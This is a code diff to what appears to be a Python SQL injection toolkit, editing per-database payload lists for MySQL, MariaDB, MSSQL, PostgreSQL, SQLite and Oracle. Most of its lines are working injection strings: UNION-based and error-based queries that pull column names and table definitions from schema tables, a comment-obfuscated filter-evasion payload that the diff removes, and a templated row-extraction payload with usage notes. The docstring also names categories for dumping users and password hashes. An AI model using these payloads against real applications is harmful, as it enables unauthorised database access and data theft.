@@ -24,9 +24,7 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
-            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
-            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='TARGET_TABLE'),NULL-- -",
-            "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x54415247455f5441424c45)",
+            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
         ],
     },
     "mariadb": {
@@ -37,7 +35,7 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
-            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='TARGET_TABLE'),NULL-- -",
+            "' UNION SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() LIMIT 1),NULL-- -",
         ],
     },
     "mssql": {
@@ -48,7 +46,6 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
-            "' UNION SELECT TOP 1 column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
         ],
     },
     "postgres": {
@@ -59,7 +56,7 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='public' LIMIT 1) AS int)-- -",
-            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
+            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='public' LIMIT 1-- -",
         ],
     },
     "sqlite": {
@@ -69,7 +66,7 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             # SQLite PRAGMA — needs stacked queries or creative injection
-            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='TARGET_TABLE'-- -",
+            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' LIMIT 1-- -",
         ],
     },
     "oracle": {
@@ -80,7 +77,7 @@ DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
         ],
         "columns": [
             "' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE rownum=1) AS INTEGER)-- -",
-            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TARGET_TABLE' AND rownum=1-- -",
+            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE rownum=1-- -",
         ],
     },
 }
@@ -291,7 +288,9 @@ ENUM_PAYLOADS: dict[str, List[str]] = {
         "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=0-- -",
     ],
     "nth_row": [
-        # Parametric: replace {offset} and {table}/{column} at runtime
+        # Template payload — requires substitution of {offset}, {tbl}, {col} at call site.
+        # Not injected directly; use get_enum_payloads("nth_row") and call
+        # payload.format(offset=N, tbl="table_name", col="column_name") before use.
         "' UNION SELECT {col},NULL FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {offset}-- -",
     ],
 }
@@ -304,5 +303,9 @@ def get_enum_payloads(category: str) -> List[str]:
     ``current_database``, ``list_databases``, ``list_users``,
     ``password_hashes``, ``find_tables_by_column``, ``conditional``,
     ``nth_row``.
+
+    Note: ``nth_row`` payloads are templates containing ``{offset}``,
+    ``{tbl}``, and ``{col}`` placeholders.  Call
+    ``payload.format(offset=N, tbl=..., col=...)`` before injecting.
     """
     return ENUM_PAYLOADS.get(category, [])
